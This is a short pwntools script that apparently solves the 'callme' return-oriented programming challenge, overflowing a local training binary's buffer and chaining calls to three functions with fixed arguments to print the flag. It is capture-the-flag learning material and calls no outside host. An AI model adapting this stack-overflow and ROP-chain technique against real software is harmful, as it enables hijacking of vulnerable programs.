from pwn import *

context.arch = "amd64"

elf = ELF("./callme")
p = elf.process()

rop = ROP(elf)
rop.raw(b"A"*40)
rop.call(elf.symbols["callme_one"], [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])
rop.call(elf.symbols["callme_two"], [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])
rop.call(elf.symbols["callme_three"], [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])

p.recvuntil("> ")
p.sendline(rop.chain())

p.recvuntil("ROPE")
log.info(b"ROPE" + p.recvall(timeout=1))
